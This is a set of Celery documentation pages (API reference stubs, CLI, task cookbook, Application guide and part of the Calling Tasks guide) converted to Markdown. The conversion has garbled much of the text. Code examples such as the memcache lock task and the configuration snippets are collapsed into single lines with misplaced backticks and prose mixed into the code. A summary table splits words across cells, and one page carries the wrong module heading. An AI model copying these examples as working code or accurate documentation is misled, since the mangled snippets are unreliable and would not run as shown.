celery.contrib.testing.app.md

---

# `celery.contrib.testing.app`

<div class="contents" data-local="">

</div>

## API Reference

<div class="currentmodule">

celery.contrib.testing.app

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.contrib.testing.app

</div>

---

celery.contrib.testing.manager.md

---

# `celery.contrib.testing.manager`

<div class="contents" data-local="">

</div>

## API Reference

<div class="currentmodule">

celery.contrib.testing.manager

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.contrib.testing.manager

</div>

---

celery.contrib.testing.mocks.md

---

# `celery.contrib.testing.mocks`

<div class="contents" data-local="">

</div>

## API Reference

<div class="currentmodule">

celery.contrib.testing.mocks

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.contrib.testing.mocks

</div>

---

celery.contrib.testing.worker.md

---

# `celery.contrib.testing.worker`

<div class="contents" data-local="">

</div>

## API Reference

<div class="currentmodule">

celery.contrib.testing.worker

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.contrib.testing.worker

</div>

---

celery.events.dispatcher.md

---

# `celery.events.state`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.events.dispatcher

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.events.dispatcher

</div>

---

celery.events.event.md

---

# `celery.events.event`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.events.event

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.events.event

</div>

---

celery.events.md

---

# `celery.events`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.events

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.events

</div>

---

celery.events.receiver.md

---

# `celery.events.receiver`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.events.receiver

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.events.receiver

</div>

---

celery.events.state.md

---

# `celery.events.state`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.events.state

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.events.state

</div>

---

celery.exceptions.md

---

# `celery.exceptions`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.exceptions

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.exceptions

</div>

---

celery.loaders.app.md

---

# `celery.loaders.app`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.loaders.app

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.loaders.app

</div>

---

celery.loaders.base.md

---

# `celery.loaders.base`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.loaders.base

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.loaders.base

</div>

---

celery.loaders.default.md

---

# `celery.loaders.default`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.loaders.default

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.loaders.default

</div>

---

celery.loaders.md

---

# `celery.loaders`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.loaders

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.loaders

</div>

---

celery.md

---

# `celery` --- Distributed processing

<div class="currentmodule">

celery

</div>

<div class="module" data-synopsis="Distributed processing">

celery

</div>

<div class="moduleauthor">

Ask Solem \<<ask@celeryproject.org>\>

</div>

<div class="sectionauthor">

Ask Solem \<<ask@celeryproject.org>\>

</div>

-----

This module is the main entry-point for the Celery API. It includes commonly needed things for calling tasks, and creating Celery applications.

<table>
<tbody>
<tr class="odd">
<td><span class="title-ref">Celery</span> Celery</td>
<td>application instance</td>
</tr>
<tr class="even">
<td><span class="title-ref">group</span> group t</td>
<td>asks together</td>
</tr>
<tr class="odd">
<td><span class="title-ref">chain</span> chain t</td>
<td>asks together</td>
</tr>
<tr class="even">
<td><span class="title-ref">chord</span> chords</td>
<td>enable callbacks for groups</td>
</tr>
<tr class="odd">
<td><span class="title-ref">signature</span> create</td>
<td><blockquote>
<p>a new task signature</p>
</blockquote></td>
</tr>
<tr class="even">
<td><span class="title-ref">Signature</span> object</td>
<td>describing a task invocation</td>
</tr>
<tr class="odd">
<td><span class="title-ref">current_app</span> proxy</td>
<td>to the current application instance</td>
</tr>
<tr class="even">
<td><span class="title-ref">current_task</span> proxy</td>
<td>to the currently executing task</td>
</tr>
</tbody>
</table>

## <span class="title-ref">Celery</span> application objects

<div class="versionadded">

2.5

</div>

<div class="autoclass">

Celery

<div class="autoattribute">

user\_options

</div>

<div class="autoattribute">

steps

</div>

<div class="autoattribute">

current\_task

</div>

<div class="autoattribute">

current\_worker\_task

</div>

<div class="autoattribute">

amqp

</div>

<div class="autoattribute">

backend

</div>

<div class="autoattribute">

loader

</div>

<div class="autoattribute">

control

</div>

<div class="autoattribute">

events

</div>

<div class="autoattribute">

log

</div>

<div class="autoattribute">

tasks

</div>

<div class="autoattribute">

pool

</div>

<div class="autoattribute">

producer\_pool

</div>

<div class="autoattribute">

Task

</div>

<div class="autoattribute">

timezone

</div>

<div class="autoattribute">

builtin\_fixups

</div>

<div class="autoattribute">

oid

</div>

<div class="automethod">

close

</div>

<div class="automethod">

signature

</div>

<div class="automethod">

bugreport

</div>

<div class="automethod">

config\_from\_object

</div>

<div class="automethod">

config\_from\_envvar

</div>

<div class="automethod">

autodiscover\_tasks

</div>

<div class="automethod">

add\_defaults

</div>

<div class="automethod">

add\_periodic\_task

</div>

<div class="automethod">

setup\_security

</div>

<div class="automethod">

task

</div>

<div class="automethod">

send\_task

</div>

<div class="automethod">

gen\_task\_name

</div>

<div class="autoattribute">

AsyncResult

</div>

<div class="autoattribute">

GroupResult

</div>

<div class="autoattribute">

Worker

</div>

<div class="autoattribute">

WorkController

</div>

<div class="autoattribute">

Beat

</div>

<div class="automethod">

connection\_for\_read

</div>

<div class="automethod">

connection\_for\_write

</div>

<div class="automethod">

connection

</div>

<div class="automethod">

connection\_or\_acquire

</div>

<div class="automethod">

producer\_or\_acquire

</div>

<div class="automethod">

select\_queues

</div>

<div class="automethod">

now

</div>

<div class="automethod">

set\_current

</div>

<div class="automethod">

set\_default

</div>

<div class="automethod">

finalize

</div>

<div class="automethod">

on\_init

</div>

<div class="automethod">

prepare\_config

</div>

<div class="data">

on\_configure

Signal sent when app is loading configuration.

</div>

<div class="data">

on\_after\_configure

Signal sent after app has prepared the configuration.

</div>

<div class="data">

on\_after\_finalize

Signal sent after app has been finalized.

</div>

<div class="data">

on\_after\_fork

Signal sent in child process after fork.

</div>

</div>

## Canvas primitives

See \[guide-canvas\](\#guide-canvas) for more about creating task work-flows.

<div class="autoclass">

group

</div>

<div class="autoclass">

chain

</div>

<div class="autoclass">

chord

</div>

<div class="autofunction">

signature

</div>

<div class="autoclass">

Signature

</div>

## Proxies

<div class="data">

current\_app

The currently set app for this thread.

</div>

<div class="data">

current\_task

The task currently being executed (only set in the worker, or when eager/apply is used).

</div>

---

celery.result.md

---

# `celery.result`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.result

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.result

</div>

---

celery.schedules.md

---

# `celery.schedules`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.schedules

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.schedules

</div>

---

celery.security.md

---

# `celery.security`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.security

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.security

</div>

---

celery.signals.md

---

# `celery.signals`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.signals

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.signals

</div>

---

celery.states.md

---

<div class="currentmodule">

celery.states

</div>

<div class="contents" data-local="">

</div>

<div class="automodule" data-members="">

celery.states

</div>

---

celery.utils.debug.md

---

# `celery.utils.debug`

<div class="contents" data-local="">

</div>

## Sampling Memory Usage

This module can be used to diagnose and sample the memory usage used by parts of your application.

For example, to sample the memory usage of calling tasks you can do this:

`` `python     from celery.utils.debug import sample_mem, memdump      from tasks import add       try:         for i in range(100):             for j in range(100):                 add.delay(i, j)             sample_mem()     finally:         memdump()   API Reference ``\` =============

<div class="currentmodule">

celery.utils.debug

</div>

<div class="automodule">

celery.utils.debug

<div class="autofunction">

sample\_mem

</div>

<div class="autofunction">

memdump

</div>

<div class="autofunction">

sample

</div>

<div class="autofunction">

mem\_rss

</div>

<div class="autofunction">

ps

</div>

</div>

---

celery.worker.consumer.agent.md

---

# `celery.worker.consumer.agent`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.consumer.agent

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.consumer.agent

</div>

---

celery.worker.consumer.connection.md

---

# `celery.worker.consumer.connection`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.consumer.connection

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.consumer.connection

</div>

---

celery.worker.consumer.consumer.md

---

# `celery.worker.consumer.consumer`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.consumer.consumer

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.consumer.consumer

</div>

---

celery.worker.consumer.control.md

---

# `celery.worker.consumer.control`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.consumer.control

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.consumer.control

</div>

---

celery.worker.consumer.events.md

---

# `celery.worker.consumer.events`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.consumer.events

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.consumer.events

</div>

---

celery.worker.consumer.gossip.md

---

# `celery.worker.consumer.gossip`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.consumer.gossip

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.consumer.gossip

</div>

---

celery.worker.consumer.heart.md

---

# `celery.worker.consumer.heart`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.consumer.heart

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.consumer.heart

</div>

---

celery.worker.consumer.md

---

# `celery.worker.consumer`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.consumer

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.consumer

</div>

---

celery.worker.consumer.mingle.md

---

# `celery.worker.consumer.mingle`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.consumer.mingle

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.consumer.mingle

</div>

---

celery.worker.consumer.tasks.md

---

# `celery.worker.consumer.tasks`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.consumer.tasks

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.consumer.tasks

</div>

---

celery.worker.md

---

# `celery.worker`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker

</div>

---

celery.worker.request.md

---

# `celery.worker.request`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.request

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.request

</div>

---

celery.worker.state.md

---

# `celery.worker.state`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.state

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.state

</div>

---

celery.worker.strategy.md

---

# `celery.worker.strategy`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.strategy

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.strategy

</div>

---

celery.worker.worker.md

---

# `celery.worker.worker`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.worker

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.worker

</div>

---

cli.md

---

# Command Line Interface

<div class="note">

<div class="title">

Note

</div>

The prefix <span class="title-ref">CELERY\_</span> must be added to the names of the environment variables described below. E.g., <span class="title-ref">APP</span> becomes <span class="title-ref">CELERY\_APP</span>.

</div>

<div class="click" data-prog="celery" data-nested="full">

celery.bin.celery:celery

</div>

---

index.md

---

# API Reference

  - Release  

  - Date  

<div class="toctree" data-maxdepth="1">

cli celery celery.app celery.app.task celery.app.amqp celery.app.defaults celery.app.control celery.app.registry celery.app.backends celery.app.builtins celery.app.events celery.app.log celery.app.utils celery.app.autoretry celery.bootsteps celery.result celery.schedules celery.signals celery.security celery.utils.debug celery.exceptions celery.loaders celery.loaders.app celery.loaders.default celery.loaders.base celery.states celery.contrib.abortable celery.contrib.django.task celery.contrib.migrate celery.contrib.pytest celery.contrib.sphinx celery.contrib.testing.worker celery.contrib.testing.app celery.contrib.testing.manager celery.contrib.testing.mocks celery.contrib.rdb celery.events celery.events.receiver celery.events.dispatcher celery.events.event celery.events.state celery.beat celery.apps.worker celery.apps.beat celery.apps.multi celery.worker celery.worker.request celery.worker.state celery.worker.strategy celery.worker.consumer celery.worker.consumer.agent celery.worker.consumer.connection celery.worker.consumer.consumer celery.worker.consumer.control celery.worker.consumer.events celery.worker.consumer.gossip celery.worker.consumer.heart celery.worker.consumer.mingle celery.worker.consumer.tasks celery.worker.worker celery.bin.base celery.bin.celery celery.bin.worker celery.bin.beat celery.bin.events celery.bin.logtool celery.bin.amqp celery.bin.graph celery.bin.multi celery.bin.call celery.bin.control celery.bin.list celery.bin.migrate celery.bin.purge celery.bin.result celery.bin.shell celery.bin.upgrade

</div>

---

index.md

---

# Tutorials

  - Release  

  - Date  

<div class="toctree" data-maxdepth="2">

task-cookbook

</div>

---

task-cookbook.md

---

# Task Cookbook

<div class="contents" data-local="">

</div>

## Ensuring a task is only executed one at a time

You can accomplish this by using a lock.

In this example we'll be using the cache framework to set a lock that's accessible for all workers.

It's part of an imaginary RSS feed importer called <span class="title-ref">djangofeeds</span>. The task takes a feed URL as a single argument, and imports that feed into a Django model called <span class="title-ref">Feed</span>. We ensure that it's not possible for two or more workers to import the same feed at the same time by setting a cache key consisting of the MD5 check-sum of the feed URL.

The cache key expires after some time in case something unexpected happens, and something always will...

For this reason your tasks run-time shouldn't exceed the timeout.

\> **Note** \> In order for this to work correctly you need to be using a cache backend where the `.add` operation is atomic. `memcached` is known to work well for this purpose.

`` `python import time from celery import task from celery.utils.log import get_task_logger from contextlib import contextmanager from django.core.cache import cache from hashlib import md5 from djangofeeds.models import Feed  logger = get_task_logger(__name__)  LOCK_EXPIRE = 60 * 10  # Lock expires in 10 minutes  @contextmanager def memcache_lock(lock_id, oid):     timeout_at = time.monotonic() + LOCK_EXPIRE - 3     # cache.add fails if the key already exists     status = cache.add(lock_id, oid, LOCK_EXPIRE)     try:         yield status     finally:         # memcache delete is very slow, but we have to use it to take         # advantage of using add() for atomic locking         if time.monotonic() < timeout_at and status:             # don't release the lock if we exceeded the timeout             # to lessen the chance of releasing an expired lock             # owned by someone else             # also don't release the lock if we didn't acquire it             cache.delete(lock_id)  @task(bind=True) def import_feed(self, feed_url):     # The cache key consists of the task name and the MD5 digest     # of the feed URL.     feed_url_hexdigest = md5(feed_url).hexdigest()     lock_id = '{0}-lock-{1}'.format(self.name, feed_url_hexdigest)     logger.debug('Importing feed: %s', feed_url)     with memcache_lock(lock_id, self.app.oid) as acquired:         if acquired:             return Feed.objects.import_feed(feed_url).url     logger.debug(         'Feed %s is already being imported by another worker', feed_url) ``\`

---

application.md

---

# Application

<div class="contents" data-local="" data-depth="1">

</div>

The Celery library must be instantiated before use, this instance is called an application (or *app* for short).

The application is thread-safe so that multiple Celery applications with different configurations, components, and tasks can co-exist in the same process space.

Let's create one now:

`` `pycon     >>> from celery import Celery     >>> app = Celery()     >>> app     <Celery __main__:0x100469fd0>  The last line shows the textual representation of the application: ``<span class="title-ref"> including the name of the app class (</span><span class="title-ref">Celery</span><span class="title-ref">), the name of the current main module (</span><span class="title-ref">\_\_main\_\_</span><span class="title-ref">), and the memory address of the object (</span><span class="title-ref">0x100469fd0</span>\`).

## Main Name

Only one of these is important, and that's the main module name. Let's look at why that is.

When you send a task message in Celery, that message won't contain any source code, but only the name of the task you want to execute. This works similarly to how host names work on the internet: every worker maintains a mapping of task names to their actual functions, called the *task registry*.

Whenever you define a task, that task will also be added to the local registry:

`` `pycon     >>> @app.task     ... def add(x, y):     ...     return x + y      >>> add     <@task: __main__.add>      >>> add.name     __main__.add      >>> app.tasks['__main__.add']     <@task: __main__.add>  and there you see that ``\_\_main\_\_`again; whenever Celery isn't able`\` to detect what module the function belongs to, it uses the main module name to generate the beginning of the task name.

This is only a problem in a limited set of use cases:

> 1.  If the module that the task is defined in is run as a program.
> 2.  If the application is created in the Python shell (REPL).

For example here, where the tasks module is also used to start a worker with \`@worker\_main\`:

`tasks.py`:

`` `python     from celery import Celery     app = Celery()      @app.task     def add(x, y): return x + y      if __name__ == '__main__':         args = ['worker', '--loglevel=INFO']         app.worker_main(argv=args)  When this module is executed the tasks will be named starting with " ``\_\_main\_\_`",`<span class="title-ref"> but when the module is imported by another process, say to call a task, the tasks will be named starting with "</span><span class="title-ref">tasks</span>\`" (the real name of the module):

`` `pycon     >>> from tasks import add     >>> add.name     tasks.add  You can specify another name for the main module:  .. code-block:: pycon      >>> app = Celery('tasks')     >>> app.main     'tasks'      >>> @app.task     ... def add(x, y):     ...     return x + y      >>> add.name     tasks.add  .. seealso:: [task-names](#task-names)  Configuration ``\` =============

There are several options you can set that'll change how Celery works. These options can be set directly on the app instance, or you can use a dedicated configuration module.

The configuration is available as \`@conf\`:

`` `pycon     >>> app.conf.timezone     'Europe/London'  where you can also set configuration values directly:  .. code-block:: pycon      >>> app.conf.enable_utc = True  or update several keys at once by using the ``update`method:  .. code-block:: python      >>> app.conf.update(     ...     enable_utc=True,     ...     timezone='Europe/London',     ...)  The configuration object consists of multiple dictionaries`\` that are consulted in order:

> 1.  Changes made at run-time.
> 2.  The configuration module (if any)
> 3.  The default configuration (`celery.app.defaults`).

You can even add new default sources by using the <span class="title-ref">@add\_defaults</span> method.

<div class="seealso">

Go to the \[Configuration reference \<configuration\>\](\#configuration-reference-\<configuration\>) for a complete listing of all the available settings, and their default values.

</div>

### `config_from_object`

The <span class="title-ref">@config\_from\_object</span> method loads configuration from a configuration object.

This can be a configuration module, or any object with configuration attributes.

Note that any configuration that was previously set will be reset when <span class="title-ref">\~@config\_from\_object</span> is called. If you want to set additional configuration you should do so after.

#### Example 1: Using the name of a module

The <span class="title-ref">@config\_from\_object</span> method can take the fully qualified name of a Python module, or even the name of a Python attribute, for example: `"celeryconfig"`, `"myproj.config.celery"`, or `"myproj.config:CeleryConfig"`:

`` `python     from celery import Celery      app = Celery()     app.config_from_object('celeryconfig')  The ``celeryconfig``module may then look like this:  :file:`celeryconfig.py`:  .. code-block:: python      enable_utc = True     timezone = 'Europe/London'  and the app will be able to use it as long as``import celeryconfig`is`\` possible.

#### Example 2: Passing an actual module object

You can also pass an already imported module object, but this isn't always recommended.

\> **Tip** \> Using the name of a module is recommended as this means the module does not need to be serialized when the prefork pool is used. If you're experiencing configuration problems or pickle errors then please try using the name of a module instead.

`` `python     import celeryconfig      from celery import Celery      app = Celery()     app.config_from_object(celeryconfig)   Example 3:  Using a configuration class/object ``\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

`` `python     from celery import Celery      app = Celery()      class Config:         enable_utc = True         timezone = 'Europe/London'      app.config_from_object(Config)     # or using the fully qualified name of the object:     #   app.config_from_object('module:Config') ``config\_from\_envvar`  `\` ----------------------

The <span class="title-ref">@config\_from\_envvar</span> takes the configuration module name from an environment variable

For example -- to load configuration from a module specified in the environment variable named `CELERY_CONFIG_MODULE`:

`` `python     import os     from celery import Celery      #: Set default configuration module name     os.environ.setdefault('CELERY_CONFIG_MODULE', 'celeryconfig')      app = Celery()     app.config_from_envvar('CELERY_CONFIG_MODULE')  You can then specify the configuration module to use via the environment:  .. code-block:: console      $ CELERY_CONFIG_MODULE="celeryconfig.prod" celery worker -l INFO  .. _app-censored-config:  Censored configuration ``\` ----------------------

If you ever want to print out the configuration, as debugging information or similar, you may also want to filter out sensitive information like passwords and API keys.

Celery comes with several utilities useful for presenting the configuration, one is \`\~celery.app.utils.Settings.humanize\`:

`` `pycon     >>> app.conf.humanize(with_defaults=False, censored=True)  This method returns the configuration as a tabulated string. This will ``<span class="title-ref"> only contain changes to the configuration by default, but you can include the built-in default keys and values by enabling the </span><span class="title-ref">with\_defaults</span>\` argument.

If you instead want to work with the configuration as a dictionary, you can use the <span class="title-ref">\~celery.app.utils.Settings.table</span> method:

`` `pycon     >>> app.conf.table(with_defaults=False, censored=True)  Please note that Celery won't be able to remove all sensitive information, ``\` as it merely uses a regular expression to search for commonly named keys. If you add custom settings containing sensitive information you should name the keys using a name that Celery identifies as secret.

A configuration setting will be censored if the name contains any of these sub-strings:

`API`, `TOKEN`, `KEY`, `SECRET`, `PASS`, `SIGNATURE`, `DATABASE`

## Laziness

The application instance is lazy, meaning it won't be evaluated until it's actually needed.

Creating a <span class="title-ref">@Celery</span> instance will only do the following:

> 1.  Create a logical clock instance, used for events.
> 2.  Create the task registry.
> 3.  Set itself as the current app (but not if the `set_as_current` argument was disabled)
> 4.  Call the <span class="title-ref">@on\_init</span> callback (does nothing by default).

The <span class="title-ref">@task</span> decorators don't create the tasks at the point when the task is defined, instead it'll defer the creation of the task to happen either when the task is used, or after the application has been *finalized*,

This example shows how the task isn't created until you use the task, or access an attribute (in this case <span class="title-ref">repr</span>):

`` `pycon     >>> @app.task     >>> def add(x, y):     ...    return x + y      >>> type(add)     <class 'celery.local.PromiseProxy'>      >>> add.__evaluated__()     False      >>> add        # <-- causes repr(add) to happen     <@task: __main__.add>      >>> add.__evaluated__()     True  *Finalization* of the app happens either explicitly by calling ``<span class="title-ref"> </span>@finalize\` -- or implicitly by accessing the <span class="title-ref">@tasks</span> attribute.

Finalizing the object will:

> 1.  Copy tasks that must be shared between apps
>     
>     > Tasks are shared by default, but if the `shared` argument to the task decorator is disabled, then the task will be private to the app it's bound to.
> 
> 2.  Evaluate all pending task decorators.
> 
> 3.  Make sure all tasks are bound to the current app.
>     
>     > Tasks are bound to an app so that they can read default values from the configuration.

<div id="default-app">

<div class="topic">

**The "default app"**

Celery didn't always have applications, it used to be that there was only a module-based API. A compatibility API was available at the old location until the release of Celery 5.0, but has been removed.

Celery always creates a special app - the "default app", and this is used if no custom application has been instantiated.

The `celery.task` module is no longer available. Use the methods on the app instance, not the module based API:

  - \`\`\`python  
    from celery.task import Task \# \<\< OLD Task base class.
    
    from celery import Task \# \<\< NEW base class.

</div>

</div>

Breaking the chain `` ` ==================  While it's possible to depend on the current app being set, the best practice is to always pass the app instance around to anything that needs it.  I call this the "app chain", since it creates a chain of instances depending on the app being passed.  The following example is considered bad practice: ``\`python from celery import current\_app

> class Scheduler:
> 
> >   - def run(self):  
> >     app = current\_app

Instead it should take the `app` as an argument:

``` python
class Scheduler:

    def __init__(self, app):
        self.app = app
```

Internally Celery uses the <span class="title-ref">celery.app.app\_or\_default</span> function `` ` so that everything also works in the module-based compatibility API ``\`python from celery.app import app\_or\_default

>   - class Scheduler:
>     
>       - def \_\_init\_\_(self, app=None):  
>         self.app = app\_or\_default(app)

In development you can set the `CELERY_TRACE_APP` `` ` environment variable to raise an exception if the app chain breaks: ``\`console $ CELERY\_TRACE\_APP=1 celery worker -l INFO

<div class="topic">

**Evolving the API**

Celery has changed a lot from 2009 since it was initially created.

For example, in the beginning it was possible to use any callable as a task:

``` pycon
def hello(to):
    return 'hello {0}'.format(to)

>>> from celery.execute import apply_async

>>> apply_async(hello, ('world!',))
```

or you could also create a `Task` class to set certain options, or override other behavior

``` python
from celery import Task
from celery.registry import tasks

class Hello(Task):
    queue = 'hipri'

    def run(self, to):
        return 'hello {0}'.format(to)
tasks.register(Hello)

>>> Hello.delay('world!')
```

Later, it was decided that passing arbitrary call-able's was an anti-pattern, since it makes it very hard to use serializers other than pickle, and the feature was removed in 2.0, replaced by task decorators:

``` python
from celery import app

@app.task(queue='hipri')
def hello(to):
    return 'hello {0}'.format(to)
```

</div>

Abstract Tasks `` ` ==============  All tasks created using the `@task` decorator will inherit from the application's base `~@Task` class.  You can specify a different base class using the ``base`argument:`\`python @app.task(base=OtherTask): def add(x, y): return x + y

To create a custom task class you should inherit from the neutral base `` ` class: `celery.Task`. ``\`python from celery import Task

> class DebugTask(Task):
> 
> > def \_\_call\_\_(self, *args,kwargs): print('TASK STARTING: {0.name}\[{0.request.id}\]'.format(self)) return self.run(*args, \*\*kwargs)

\> **Tip** \> If you override the task's `__call__` method, then it's very important that you also call `self.run` to execute the body of the task. Do not call `super().__call__`. The `__call__` method of the neutral base class <span class="title-ref">celery.Task</span> is only present for reference. For optimization, this has been unrolled into `celery.app.trace.build_tracer.trace_task` which calls `run` directly on the custom task class if no `__call__` method is defined.

The neutral base class is special because it's not bound to any specific app `` ` yet. Once a task is bound to an app it'll read configuration to set default values, and so on.  To realize a base class you need to create a task using the `@task` decorator: ``\`python @app.task(base=DebugTask) def add(x, y): return x + y

It's even possible to change the default base class for an application `` ` by changing its `@Task` attribute: ``\`pycon \>\>\> from celery import Celery, Task

\>\>\> app = Celery()

\>\>\> class MyBaseTask(Task): ... queue = 'hipri'

\>\>\> app.Task = MyBaseTask \>\>\> app.Task \<unbound MyBaseTask\>

\>\>\> @app.task ... def add(x, y): ... return x + y

\>\>\> add \<@task: \_\_main\_\_.add\>

\>\>\> add.\_\_class\_\_.mro() \[\<class add of \<Celery \_\_main\_\_:0x1012b4410\>\>, \<unbound MyBaseTask\>, \<unbound Task\>, \<type 'object'\>\] \`\`\`

---

calling.md

---

# Calling Tasks

<div class="contents" data-local="" data-depth="1">

</div>

## Basics

This document describes Celery's uniform "Calling API" used by task instances and the \[canvas \<guide-canvas\>\](\#canvas-\<guide-canvas\>).

The API defines a standard set of execution options, as well as three methods:

>   - `apply_async(args[, kwargs[, …]])`
>     
>     > Sends a task message.
> 
>   - `delay(*args, **kwargs)`
>     
>     > Shortcut to send a task message, but doesn't support execution options.
> 
>   - *calling* (`__call__`)
>     
>     > Applying an object supporting the calling API (e.g., `add(2, 2)`) means that the task will not be executed by a worker, but in the current process instead (a message won't be sent).

<div id="calling-cheat">

<div class="topic">

**Quick Cheat Sheet**

  -   - `T.delay(arg, kwarg=value)`  
        Star arguments shortcut to `.apply_async`. (`.delay(*args, **kwargs)` calls `.apply_async(args, kwargs)`).

  - `T.apply_async((arg,), {'kwarg': value})`

  -   - `T.apply_async(countdown=10)`  
        executes in 10 seconds from now.

  -   - `T.apply_async(eta=now + timedelta(seconds=10))`  
        executes in 10 seconds from now, specified using `eta`

  -   - `T.apply_async(countdown=60, expires=120)`  
        executes in one minute from now, but expires after 2 minutes.

  -   - `T.apply_async(expires=now + timedelta(days=2))`  
        expires in 2 days, set using <span class="title-ref">\~datetime.datetime</span>.

</div>

</div>

### Example

The <span class="title-ref">\~@Task.delay</span> method is convenient as it looks like calling a regular function:

`` `python     task.delay(arg1, arg2, kwarg1='x', kwarg2='y')  Using `~@Task.apply_async` instead you have to write:  .. code-block:: python      task.apply_async(args=[arg1, arg2], kwargs={'kwarg1': 'x', 'kwarg2': 'y'})  .. sidebar:: Tip      If the task isn't registered in the current process     you can use `~@send_task` to call the task by name instead.   So `delay` is clearly convenient, but if you want to set additional execution ``<span class="title-ref"> options you have to use </span><span class="title-ref">apply\_async</span>\`.

The rest of this document will go into the task execution options in detail. All examples use a task called <span class="title-ref">add</span>, returning the sum of two arguments:

`` `python     @app.task     def add(x, y):         return x + y   .. topic:: There's another way…      You'll learn more about this later while reading about the [Canvas     <guide-canvas>](#canvas ----<guide-canvas>), but `~celery.signature`'s are objects used to pass around     the signature of a task invocation, (for example to send it over the     network), and they also support the Calling API:      .. code-block:: python          task.s(arg1, arg2, kwarg1='x', kwargs2='y').apply_async()  .. _calling-links:  Linking (callbacks/errbacks) ``\` ============================

Celery supports linking tasks together so that one task follows another. The callback task will be applied with the result of the parent task as a partial argument:

`` `python     add.apply_async((2, 2), link=add.s(16))  .. sidebar:: What's ``s`?      The`add.s``call used here is called a signature. If you     don't know what they are you should read about them in the     [canvas guide <guide-canvas>](#canvas-guide-<guide-canvas>).     There you can also learn about `~celery.chain`:  a simpler     way to chain tasks together.      In practice the``link`execution option is considered an internal     primitive, and you'll probably not use it directly, but     use chains instead.  Here the result of the first task (4) will be sent to a new`<span class="title-ref"> task that adds 16 to the previous result, forming the expression :math:</span>(2 + 2) + 16 = 20\`

You can also cause a callback to be applied if task raises an exception (*errback*). The worker won't actually call the errback as a task, but will instead call the errback function directly so that the raw request, exception and traceback objects can be passed to it.

This is an example error callback:

`` `python     @app.task     def error_handler(request, exc, traceback):         print('Task {0} raised exception: {1!r}\n{2!r}'.format(               request.id, exc, traceback))  it can be added to the task using the ``link\_error`execution`\` option:

`` `python     add.apply_async((2, 2), link_error=error_handler.s())   In addition, both the ``link`and`link\_error`options can be expressed`\` as a list:

`` `python     add.apply_async((2, 2), link=[add.s(16), other_task.s()])  The callbacks/errbacks will then be called in order, and all ``\` callbacks will be called with the return value of the parent task as a partial argument.

In the case of a chord, we can handle errors using multiple handling strategies. See \[chord error handling \<chord-errors\>\](\#chord-error-handling-\<chord-errors\>) for more information.

## On message

Celery supports catching all states changes by setting on\_message callback.

For example for long-running tasks to send task progress you can do something like this:

